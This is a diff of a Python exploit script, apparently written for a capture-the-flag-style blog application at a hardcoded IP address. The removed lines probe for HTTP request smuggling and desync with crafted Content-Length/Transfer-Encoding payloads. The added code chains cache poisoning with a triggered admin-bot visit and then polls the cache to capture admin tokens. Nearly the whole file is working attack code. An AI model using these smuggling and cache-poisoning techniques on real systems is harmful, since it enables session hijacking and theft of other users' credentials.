@@ -4,6 +4,7 @@ import time
 SERVER_URL = "http://54.198.62.41"
 
 def login_user(username="user", password="user123"):
+    """Login and get token"""
     login_data = {
         "username": username,
         "password": password
@@ -11,109 +12,73 @@ def login_user(username="user", password="user123"):
     r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
     return r.json()['token']
 
-def test_basic_cache():
-    """Test if basic caching is working"""
+def test_admin_visit_exploit():
     user_token = login_user()
-    print("\n[1] Testing basic cache functionality...")
-    
-    headers = {
-        'Authorization': f'Bearer {user_token}',
-        'X-Special-Key': 'secret_cache_key'
-    }
-    
-    # First request
-    r1 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=headers)
-    print("\nFirst Request:")
-    print(f"Status: {r1.status_code}")
-    print(f"Headers: {dict(r1.headers)}")
-    first_content = r1.text
-    
-    # Second request - should be cached
-    r2 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=headers)
-    print("\nSecond Request (Should be cached):")
-    print(f"Status: {r2.status_code}")
-    print(f"Headers: {dict(r2.headers)}")
-    
-    is_same = first_content == r2.text
-    print(f"\nContent is same: {is_same}")
-    
-def test_basic_smuggling():
-    """Test if HTTP smuggling is possible"""
-    user_token = login_user()
-    print("\n[2] Testing basic HTTP smuggling...")
-    
-    # Try a basic smuggled request
-    headers = {
-        'Authorization': f'Bearer {user_token}',
-        'Content-Length': '4',
-        'Transfer-Encoding': 'chunked'
-    }
-    
-    # Send malformed request
-    data = "0\r\n\r\nX"  # Malformed chunk
-    
-    try:
-        r = requests.post(f"{SERVER_URL}/api/blog/post/1", 
-                         headers=headers,
-                         data=data,
-                         timeout=5)
-        print("Response received:")
-        print(f"Status: {r.status_code}")
-        print(f"Headers: {dict(r.headers)}")
-        print(f"Content: {r.text[:200]}")
-    except requests.exceptions.ReadTimeout:
-        print("Request timed out - might indicate successful smuggling")
-    except Exception as e:
-        print(f"Error: {str(e)}")
+    print(f"[+] Got user token: {user_token[:20]}...")
 
-def test_front_back_desync():
-    """Test for front/back end desync"""
-    user_token = login_user()
-    print("\n[3] Testing front/back end desync...")
-    
-    # Create a request with ambiguous length
-    main_request = (
-        "POST /api/blog/post/1 HTTP/1.1\r\n"
-        f"Host: {SERVER_URL}\r\n"
-        f"Authorization: Bearer {user_token}\r\n"
-        "Content-Length: 44\r\n"
-        "Transfer-Encoding: chunked\r\n"
-        "\r\n"
-        "0\r\n"
-        "\r\n"
-        "GET /api/blog/post/2 HTTP/1.1\r\n"
-        "Host: localhost\r\n"
-        "\r\n"
-    )
-    
-    headers = {
+    # Step 1: Set up cache poisoning for post 1
+    print("\n[1] Setting up cache poison...")
+    poison_headers = {
         'Authorization': f'Bearer {user_token}',
-        'Content-Length': str(len(main_request)),
-        'Transfer-Encoding': 'chunked'
+        'X-Special-Key': 'secret_cache_key',
+        'Content-Type': 'text/html',  # Try to force HTML interpretation
+        'Accept': 'text/html'
     }
     
-    try:
-        r = requests.post(f"{SERVER_URL}/api/blog/post/1",
-                         headers=headers,
-                         data=main_request,
-                         timeout=5)
-        print("Response received:")
-        print(f"Status: {r.status_code}")
-        print(f"Headers: {dict(r.headers)}")
-        print(f"Content: {r.text[:200]}")
-    except requests.exceptions.ReadTimeout:
-        print("Request timed out - might indicate successful smuggling")
-    except Exception as e:
-        print(f"Error: {str(e)}")
+    # Make the request to ensure it's cached
+    r1 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=poison_headers)
+    print(f"Cache setup status: {r1.status_code}")
+    print(f"Cache: {r1.headers.get('X-Cache-Debug')}")
+    
+    # Verify it's in cache
+    time.sleep(1)
+    r2 = requests.get(f"{SERVER_URL}/api/blog/post/1", 
+                     headers={'X-Special-Key': 'secret_cache_key'})
+    print(f"Cache verification status: {r2.status_code}")
+    print(f"Cache hit: {r2.headers.get('X-Cache-Debug')}")
+
+    # Step 2: Report the post to trigger admin visit
+    print("\n[2] Triggering admin visit...")
+    report_data = {"postId": 1}  # Use valid integer ID
+    r3 = requests.post(
+        f"{SERVER_URL}/api/blog/report",
+        headers={'Authorization': f'Bearer {user_token}'},
+        json=report_data
+    )
+    print(f"Report status: {r3.status_code}")
+
+    # Step 3: Quick requests to try to catch admin response in cache
+    print("\n[3] Attempting to catch admin response...")
+    
+    # Store seen responses to detect changes
+    seen_responses = set()
+    start_time = time.time()
+    
+    while time.time() - start_time < 10:  # Try for 10 seconds
+        # Try different cache key variations
+        for key in ['secret_cache_key', f'secret_cache_key_{int(time.time())}']:
+            r = requests.get(
+                f"{SERVER_URL}/api/blog/post/1",
+                headers={
+                    'X-Special-Key': key,
+                    'Accept': 'text/html',
+                }
+            )
+            
+            content = r.text
+            if content not in seen_responses:
+                print(f"\nNew response found with key {key}!")
+                print(f"Length: {len(content)}")
+                print(f"Preview: {content[:200]}")
+                seen_responses.add(content)
+                
+                # Check if we got admin content
+                if 'admin' in content.lower() and 'token' in content.lower():
+                    print("! Possible admin content found !")
+                    print(f"Full response: {content}")
+            
+            time.sleep(0.2)
 
 if __name__ == "__main__":
-    print("[+] Starting basic vulnerability verification...")
-    
-    print("\n=== Cache Tests ===")
-    test_basic_cache()
-    
-    print("\n=== HTTP Smuggling Tests ===")
-    test_basic_smuggling()
-    
-    print("\n=== Front/Back Desync Tests ===")
-    test_front_back_desync()
+    print("[+] Starting admin visit exploitation...")
+    test_admin_visit_exploit()  
